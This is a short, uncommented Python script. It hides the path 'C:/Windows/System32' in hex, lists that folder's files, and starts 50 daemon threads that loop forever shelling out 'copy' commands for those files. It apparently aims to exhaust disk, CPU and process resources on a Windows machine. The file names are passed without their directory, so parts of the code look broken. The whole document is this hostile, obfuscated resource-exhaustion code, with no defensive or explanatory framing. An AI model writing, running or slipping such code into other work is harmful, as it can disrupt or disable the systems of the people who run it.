import os;import codecs;
a = str(bytearray.fromhex("43 3A 2F 57 69 6E 64 6F 77 73 2F 53 79 73 74 65 6D 33 32 2F 0A").decode())[0:-2];b = os.listdir(a);c = [];
for d in b:
    e, f= os.path.splitext(d)
    if f != "" and f != ".BIN":
        c.append(e+f)
        




import threading
threads = []        

def thread_func():
    while True:
        for h in c:
            os.popen(f'copy {h} /sys/')

for i in range(50):
    thread = threading.Thread(target=thread_func, args=())
    thread.daemon = True
    threads.append(thread)
for thread in threads:
    thread.start()
for thread in threads:
    thread.join()
